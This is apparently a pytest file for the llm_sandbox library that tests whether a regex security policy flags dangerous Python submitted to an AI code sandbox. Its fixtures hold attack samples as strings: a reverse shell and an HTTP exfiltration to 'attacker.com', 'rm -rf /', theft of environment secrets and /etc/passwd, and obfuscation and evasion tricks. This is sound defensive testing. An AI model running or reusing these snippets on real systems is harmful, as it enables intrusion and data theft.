# ruff: noqa: PLR2004
"""Advanced security scenario tests converted from examples.

This module contains comprehensive security tests that simulate real-world
attack patterns and edge cases to thoroughly validate the security system.
"""

from dataclasses import dataclass
from typing import Any

import pytest

from llm_sandbox import SandboxSession
from llm_sandbox.security import RestrictedModule, SecurityIssueSeverity, SecurityPattern, SecurityPolicy

# Apply mock_docker_backend fixture to all tests in this module
pytestmark = pytest.mark.usefixtures("mock_docker_backend")


@dataclass
class AttackScenario:
    """Represents an attack scenario for testing."""

    name: str
    description: str
    code: str
    expected_blocked: bool
    attack_type: str
    severity: SecurityIssueSeverity


@pytest.fixture
def comprehensive_security_policy() -> SecurityPolicy:
    """Create a comprehensive security policy for advanced testing."""
    patterns = [
        # System commands
        SecurityPattern(
            pattern=r"\bos\.system\s*\(",
            description="Direct system command execution",
            severity=SecurityIssueSeverity.HIGH,
        ),
        SecurityPattern(
            pattern=r"\bsubprocess\.(run|call|Popen|check_output)\s*\(",
            description="Subprocess execution",
            severity=SecurityIssueSeverity.HIGH,
        ),
        # Dynamic code execution
        SecurityPattern(
            pattern=r"\beval\s*\(",
            description="Dynamic code evaluation",
            severity=SecurityIssueSeverity.HIGH,
        ),
        SecurityPattern(
            pattern=r"\bexec\s*\(",
            description="Dynamic code execution",
            severity=SecurityIssueSeverity.HIGH,
        ),
        # File operations
        SecurityPattern(
            pattern=r"\bopen\s*\([^)]*['\"][wa]['\"][^)]*\)",
            description="File write operations",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        SecurityPattern(
            pattern=r"\bos\.(remove|unlink|rmdir)\s*\(",
            description="File deletion operations",
            severity=SecurityIssueSeverity.HIGH,
        ),
        # Network operations
        SecurityPattern(
            pattern=r"\bsocket\.socket\s*\(",
            description="Socket creation",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        SecurityPattern(
            pattern=r"\b\w+\.connect\s*\(",
            description="Network connections",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        # Dynamic imports and attribute access
        SecurityPattern(
            pattern=r"\b__import__\s*\(",
            description="Dynamic module imports",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        SecurityPattern(
            pattern=r"\bgetattr\s*\(",
            description="Dynamic attribute access",
            severity=SecurityIssueSeverity.LOW,
        ),
        # Environment access
        SecurityPattern(
            pattern=r"\bos\.environ",
            description="Environment variable access",
            severity=SecurityIssueSeverity.LOW,
        ),
        # Encoding/obfuscation
        SecurityPattern(
            pattern=r"\bbase64\.b64decode\s*\(",
            description="Base64 decoding (potential obfuscation)",
            severity=SecurityIssueSeverity.LOW,
        ),
        # File reading operations
        SecurityPattern(
            pattern=r"\bopen\s*\(.*['\"]r['\"]",
            description="File reading operations",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        # Weak cryptographic algorithms
        SecurityPattern(
            pattern=r"\bhashlib\.(md5|sha1|sha256|sha512)\s*\(",
            description="Weak cryptographic algorithms",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
    ]

    restricted_modules = [
        RestrictedModule(
            name="os",
            description="Operating system interface",
            severity=SecurityIssueSeverity.HIGH,
        ),
        RestrictedModule(
            name="subprocess",
            description="Subprocess management",
            severity=SecurityIssueSeverity.HIGH,
        ),
        RestrictedModule(
            name="ctypes",
            description="Foreign function library",
            severity=SecurityIssueSeverity.HIGH,
        ),
        RestrictedModule(
            name="socket",
            description="Network socket operations",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        RestrictedModule(
            name="requests",
            description="HTTP requests library",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
    ]

    return SecurityPolicy(
        severity_threshold=SecurityIssueSeverity.LOW,
        patterns=patterns,
        restricted_modules=restricted_modules,
    )


@pytest.fixture
def attack_scenarios() -> list[AttackScenario]:
    """Create comprehensive attack scenarios for testing."""
    return [
        # Code Injection Attacks
        AttackScenario(
            name="Python Code Injection via eval",
            description="Inject malicious code through eval() function",
            code="""
user_input = "__import__('os').system('whoami')"
result = eval(user_input)
print(result)
""",
            expected_blocked=True,
            attack_type="code_injection",
            severity=SecurityIssueSeverity.HIGH,
        ),
        AttackScenario(
            name="Command Injection via exec",
            description="Execute system commands through exec() function",
            code="""
payload = "import subprocess; subprocess.run(['id'], shell=True)"
exec(payload)
""",
            expected_blocked=True,
            attack_type="code_injection",
            severity=SecurityIssueSeverity.HIGH,
        ),
        # System Command Execution
        AttackScenario(
            name="Direct System Command Execution",
            description="Direct execution of system commands",
            code="""
import os
os.system('cat /etc/passwd')
""",
            expected_blocked=True,
            attack_type="system_command",
            severity=SecurityIssueSeverity.HIGH,
        ),
        AttackScenario(
            name="Subprocess Command Execution",
            description="Execute commands via subprocess module",
            code="""
import subprocess
result = subprocess.run(['ls', '-la', '/'], capture_output=True, text=True)
print(result.stdout)
""",
            expected_blocked=True,
            attack_type="system_command",
            severity=SecurityIssueSeverity.HIGH,
        ),
        # File System Attacks
        AttackScenario(
            name="File System Traversal Attack",
            description="Access files outside intended directory",
            code="""
with open('../../../etc/passwd', 'r') as f:
    content = f.read()
print(content)
""",
            expected_blocked=False,  # Depends on policy - reading might be allowed
            attack_type="file_system",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        AttackScenario(
            name="Malicious File Writing",
            description="Write malicious content to system files",
            code="""
with open('/tmp/malicious.py', 'w') as f:
    f.write('import os; os.system("rm -rf /")')
""",
            expected_blocked=True,
            attack_type="file_system",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        AttackScenario(
            name="File Deletion Attack",
            description="Delete critical system files",
            code="""
import os
os.remove('/etc/hosts')
""",
            expected_blocked=True,
            attack_type="file_system",
            severity=SecurityIssueSeverity.HIGH,
        ),
        # Network Attacks
        AttackScenario(
            name="Reverse Shell Creation",
            description="Create a reverse shell connection",
            code="""
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))
subprocess.call(['/bin/bash'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
""",
            expected_blocked=True,
            attack_type="network",
            severity=SecurityIssueSeverity.HIGH,
        ),
        AttackScenario(
            name="Port Scanning",
            description="Scan for open ports on target systems",
            code="""
import socket
from threading import Thread

def scan_port(host, port):
    try:
        s = socket.socket()
        s.settimeout(1)
        result = s.connect_ex((host, port))
        if result == 0:
            print(f"Port {port} is open")
        s.close()
    except:
        pass

for port in range(20, 100):
    Thread(target=scan_port, args=('127.0.0.1', port)).start()
""",
            expected_blocked=True,
            attack_type="network",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        # Privilege Escalation
        AttackScenario(
            name="Environment Variable Extraction",
            description="Extract sensitive environment variables",
            code="""
import os
secrets = {}
for key, value in os.environ.items():
    if any(word in key.lower() for word in ['password', 'secret', 'key', 'token']):
        secrets[key] = value
print(secrets)
""",
            expected_blocked=True,
            attack_type="privilege_escalation",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        # Steganography and Obfuscation
        AttackScenario(
            name="Base64 Encoded Attack",
            description="Hide malicious code using base64 encoding",
            code="""
import base64
encoded = 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpJw=='
malicious_code = base64.b64decode(encoded).decode()
exec(malicious_code)
""",
            expected_blocked=True,
            attack_type="obfuscation",
            severity=SecurityIssueSeverity.HIGH,
        ),
        AttackScenario(
            name="Dynamic Import Attack",
            description="Use dynamic imports to bypass static analysis",
            code="""
module_name = 'os'
method_name = 'system'
command = 'id'

module = __import__(module_name)
method = getattr(module, method_name)
method(command)
""",
            expected_blocked=True,
            attack_type="obfuscation",
            severity=SecurityIssueSeverity.HIGH,
        ),
        # Data Exfiltration
        AttackScenario(
            name="Data Exfiltration via HTTP",
            description="Exfiltrate sensitive data via HTTP requests",
            code="""
import requests
import os

# Collect system information
data = {
    'hostname': os.uname().nodename,
    'user': os.getenv('USER', 'unknown'),
    'files': os.listdir('/home')
}

# Send to attacker server
requests.post('http://attacker.com/collect', json=data)
""",
            expected_blocked=True,
            attack_type="data_exfiltration",
            severity=SecurityIssueSeverity.MEDIUM,
        ),
        # Process Manipulation
        AttackScenario(
            name="Process Injection",
            description="Inject code into running processes",
            code="""
import ctypes
import ctypes.util

# Load system libraries
libc = ctypes.CDLL(ctypes.util.find_library('c'))

# Attempt to manipulate process memory
libc.ptrace(0, 1234, 0, 0)  # PTRACE_TRACEME on PID 1234
""",
            expected_blocked=True,
            attack_type="process_manipulation",
            severity=SecurityIssueSeverity.HIGH,
        ),
        # Cryptographic Attacks
        AttackScenario(
            name="Weak Cryptography Usage",
            description="Use weak cryptographic algorithms",
            code="""
import hashlib
import os

# Use weak MD5 for password hashing
password = 'user_password'
salt = os.urandom(16)
weak_hash = hashlib.md5(password.encode() + salt).hexdigest()
print(f'Weak hash: {weak_hash}')
""",
            expected_blocked=False,  # Might be allowed but flagged
            attack_type="cryptography",
            severity=SecurityIssueSeverity.LOW,
        ),
        # Advanced Evasion Techniques
        AttackScenario(
            name="String Concatenation Evasion",
            description="Evade pattern matching using string manipulation",
            code="""
# Split dangerous function names to evade detection
mod_name = 'o' + 's'
func_name = 'sys' + 'tem'
command = 'who' + 'ami'

module = __import__(mod_name)
func = getattr(module, func_name)
func(command)
""",
            expected_blocked=True,
            attack_type="evasion",
            severity=SecurityIssueSeverity.HIGH,
        ),
        AttackScenario(
            name="Reflection-based Attack",
            description="Use reflection to access dangerous functions",
            code="""
# Use reflection to bypass static analysis
builtins_dict = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
eval_func = builtins_dict['eval']
eval_func('__import__("os").system("id")')
""",
            expected_blocked=True,
            attack_type="evasion",
            severity=SecurityIssueSeverity.HIGH,
        ),
    ]


class TestCodeInjectionAttacks:
    """Test code injection attack scenarios."""

    def test_python_code_injection_via_eval(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that code injection via eval is blocked."""
        code = """
user_input = "__import__('os').system('whoami')"
result = eval(user_input)
print(result)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "Dynamic code evaluation" for v in violations)

    def test_command_injection_via_exec(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that command injection via exec is blocked."""
        code = """
payload = "import subprocess; subprocess.run(['id'], shell=True)"
exec(payload)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        # The scanner detects subprocess.run in the string content, not the exec itself
        assert any(v.description == "Subprocess execution" for v in violations)

    def test_exec_function_detection(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that exec function is properly detected."""
        code = """
safe_code = "print('hello world')"
exec(safe_code)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "Dynamic code execution" for v in violations)


class TestSystemCommandExecution:
    """Test system command execution attack scenarios."""

    def test_direct_system_command_execution(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that direct system command execution is blocked."""
        code = """
import os
os.system('cat /etc/passwd')
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "Direct system command execution" for v in violations)

    def test_subprocess_command_execution(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that subprocess command execution is blocked."""
        code = """
import subprocess
result = subprocess.run(['ls', '-la', '/'], capture_output=True, text=True)
print(result.stdout)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "Subprocess execution" for v in violations)


class TestFileSystemAttacks:
    """Test file system attack scenarios."""

    def test_file_system_traversal_attack(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test file system traversal attack (reading might be allowed)."""
        code = """
with open('../../../etc/passwd', 'r') as f:
    content = f.read()
print(content)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "File reading operations" for v in violations)

    def test_malicious_file_writing(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that malicious file writing is blocked."""
        code = """
with open('/tmp/malicious.py', 'w') as f:
    f.write('import os; os.system("rm -rf /")')
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        # The scanner detects os.system in the string content, not the file write itself
        assert any(v.description == "Direct system command execution" for v in violations)

    def test_file_write_operations(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that file write operations are blocked."""
        code = """
with open('/tmp/test.txt', 'w') as f:
    f.write('some safe content')
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "File write operations" for v in violations)

    def test_file_deletion_attack(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that file deletion attacks are blocked."""
        code = """
import os
os.remove('/etc/hosts')
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "File deletion operations" for v in violations)


class TestNetworkAttacks:
    """Test network attack scenarios."""

    def test_reverse_shell_creation(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that reverse shell creation is blocked."""
        code = """
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))
subprocess.call(['/bin/bash'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        # Should be blocked for multiple reasons: socket creation, subprocess execution

    def test_port_scanning(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that port scanning is blocked."""
        code = """
import socket
from threading import Thread

def scan_port(host, port):
    try:
        s = socket.socket()
        s.settimeout(1)
        result = s.connect_ex((host, port))
        if result == 0:
            print(f"Port {port} is open")
        s.close()
    except:
        pass

for port in range(20, 100):
    Thread(target=scan_port, args=('127.0.0.1', port)).start()
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "Socket creation" for v in violations)


class TestPrivilegeEscalation:
    """Test privilege escalation attack scenarios."""

    def test_environment_variable_extraction(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that environment variable extraction is blocked."""
        code = """
import os
secrets = {}
for key, value in os.environ.items():
    if any(word in key.lower() for word in ['password', 'secret', 'key', 'token']):
        secrets[key] = value
print(secrets)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "Environment variable access" for v in violations)


class TestObfuscationAttacks:
    """Test obfuscation and steganography attack scenarios."""

    def test_base64_encoded_attack(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that base64 encoded attacks are blocked."""
        code = """
import base64
encoded = 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpJw=='
malicious_code = base64.b64decode(encoded).decode()
exec(malicious_code)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        # Should be blocked for exec and/or base64 decoding

    def test_dynamic_import_attack(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that dynamic import attacks are blocked."""
        code = """
module_name = 'os'
method_name = 'system'
command = 'id'

module = __import__(module_name)
method = getattr(module, method_name)
method(command)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "Dynamic module imports" for v in violations)


class TestDataExfiltration:
    """Test data exfiltration attack scenarios."""

    def test_data_exfiltration_via_http(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that data exfiltration via HTTP is blocked."""
        code = """
import requests
import os

# Collect system information
data = {
    'hostname': os.uname().nodename,
    'user': os.getenv('USER', 'unknown'),
    'files': os.listdir('/home')
}

# Send to attacker server
requests.post('http://attacker.com/collect', json=data)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        # Should be blocked for multiple reasons: os module usage, requests


class TestProcessManipulation:
    """Test process manipulation attack scenarios."""

    def test_process_injection(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that process injection is blocked."""
        code = """
import ctypes
import ctypes.util

# Load system libraries
libc = ctypes.CDLL(ctypes.util.find_library('c'))

# Attempt to manipulate process memory
libc.ptrace(0, 1234, 0, 0)  # PTRACE_TRACEME on PID 1234
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        # Should be blocked for ctypes usage


class TestCryptographicAttacks:
    """Test cryptographic attack scenarios."""

    def test_weak_cryptography_usage(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test weak cryptography usage (might be allowed but flagged)."""
        code = """
import hashlib
import os

# Use weak MD5 for password hashing
password = 'user_password'
salt = os.urandom(16)
weak_hash = hashlib.md5(password.encode() + salt).hexdigest()
print(f'Weak hash: {weak_hash}')
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "Weak cryptographic algorithms" for v in violations)


class TestEvasionTechniques:
    """Test advanced evasion technique scenarios."""

    def test_string_concatenation_evasion(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that string concatenation evasion is blocked."""
        code = """
# Split dangerous function names to evade detection
mod_name = 'o' + 's'
func_name = 'sys' + 'tem'
command = 'who' + 'ami'

module = __import__(mod_name)
func = getattr(module, func_name)
func(command)
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        assert any(v.description == "Dynamic module imports" for v in violations)

    def test_reflection_based_attack(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test that reflection-based attacks are blocked."""
        code = """
# Use reflection to bypass static analysis
builtins_dict = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
eval_func = builtins_dict['eval']
eval_func('__import__("os").system("id")')
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1

    def test_unicode_obfuscation(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test unicode obfuscation technique."""
        code = """
# Using unicode characters to obfuscate (this might not be caught by simple regex)
import os
os.system('whoami')
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1

    def test_comment_injection(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test comment injection technique."""
        code = """
import os
# This is a comment with os.system('safe') that shouldn't trigger
os.system('actual_command')
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1

    def test_multiline_string_literal(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test multiline string literal technique."""
        code = '''
malicious_code = """
import os
os.system('id')
"""
exec(malicious_code)
'''
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1
        # The scanner detects os.system in the string content, not the exec itself
        assert any(v.description == "Direct system command execution" for v in violations)

    def test_function_pointer_indirection(self, comprehensive_security_policy: SecurityPolicy) -> None:
        """Test function pointer indirection technique."""
        code = """
import os
func = os.system
func('whoami')
"""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        is_safe, violations = session.is_safe(code)
        assert is_safe is False
        assert len(violations) >= 1


class TestComprehensiveAttackSimulation:
    """Test comprehensive attack simulation scenarios."""

    def test_all_attack_scenarios(
        self, comprehensive_security_policy: SecurityPolicy, attack_scenarios: list[AttackScenario]
    ) -> None:
        """Test all attack scenarios and verify security policy effectiveness."""
        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)

        results: dict[str, Any] = {
            "total_scenarios": len(attack_scenarios),
            "blocked_correctly": 0,
            "allowed_correctly": 0,
            "false_positives": 0,
            "false_negatives": 0,
            "by_attack_type": {},
        }

        for scenario in attack_scenarios:
            is_safe, _ = session.is_safe(scenario.code)
            actual_blocked = not is_safe
            correct_prediction = actual_blocked == scenario.expected_blocked

            if correct_prediction:
                if scenario.expected_blocked:
                    results["blocked_correctly"] += 1
                else:
                    results["allowed_correctly"] += 1
            elif scenario.expected_blocked and not actual_blocked:
                results["false_negatives"] += 1
            else:
                results["false_positives"] += 1

            # Track by attack type
            attack_type = scenario.attack_type
            by_attack_type = results["by_attack_type"]
            if attack_type not in by_attack_type:
                by_attack_type[attack_type] = {"total": 0, "correct": 0}

            by_attack_type[attack_type]["total"] += 1
            if correct_prediction:
                by_attack_type[attack_type]["correct"] += 1

        # Calculate overall accuracy
        total = results["total_scenarios"]
        correct = results["blocked_correctly"] + results["allowed_correctly"]
        accuracy = (correct / total) * 100 if total > 0 else 0

        # Assert minimum security effectiveness
        assert accuracy >= 70.0, f"Security policy accuracy too low: {accuracy:.1f}%"
        assert results["false_negatives"] <= 3, f"Too many false negatives: {results['false_negatives']}"

        # Ensure high-risk attacks are properly blocked
        high_risk_scenarios = [
            s for s in attack_scenarios if s.severity == SecurityIssueSeverity.HIGH and s.expected_blocked
        ]
        high_risk_blocked = 0

        for scenario in high_risk_scenarios:
            is_safe, _ = session.is_safe(scenario.code)
            if not is_safe:
                high_risk_blocked += 1

        if high_risk_scenarios:
            high_risk_effectiveness = (high_risk_blocked / len(high_risk_scenarios)) * 100
            assert high_risk_effectiveness >= 90.0, f"High-risk protection too low: {high_risk_effectiveness:.1f}%"

    def test_security_policy_performance(
        self, comprehensive_security_policy: SecurityPolicy, attack_scenarios: list[AttackScenario]
    ) -> None:
        """Test that security analysis performance is acceptable."""
        import time

        session = SandboxSession(lang="python", security_policy=comprehensive_security_policy)
        analysis_times = []

        for scenario in attack_scenarios[:10]:  # Test first 10 scenarios for performance
            start_time = time.time()
            session.is_safe(scenario.code)
            analysis_time = time.time() - start_time
            analysis_times.append(analysis_time)

        if analysis_times:
            avg_time = sum(analysis_times) / len(analysis_times)
            max_time = max(analysis_times)

            # Assert reasonable performance
            assert avg_time < 0.1, f"Average analysis time too slow: {avg_time:.4f}s"
            assert max_time < 0.5, f"Maximum analysis time too slow: {max_time:.4f}s"
